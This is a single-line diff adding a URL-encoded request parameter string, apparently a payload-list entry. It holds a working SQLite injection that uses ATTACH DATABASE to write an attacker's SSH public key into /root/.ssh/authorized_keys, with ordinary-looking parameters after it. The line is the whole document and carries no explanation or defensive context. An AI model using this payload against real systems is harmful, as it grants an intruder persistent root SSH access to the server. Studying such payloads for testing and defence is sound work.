@@ -1,0 +1,1 @@
+u='%3bATTACH DATABASE '%2froot%2f%2essh%2fauthorized_keys' as lol%3bCREATE TABLE lol%2epwn (dataz text)%3b INSERT INTO lol%2epwn (dataz) VALUES (char(10)||char(10)||char(10)||char(10)||char(10)||"ssh-rsa AAAA....8MP%2fdbzcaHS...%2fFsFg6dELvMAn0%3d SecurityGOAT%40omnipresent.uk"||char(10))%3bselect '1&m=r&t=Hello+World
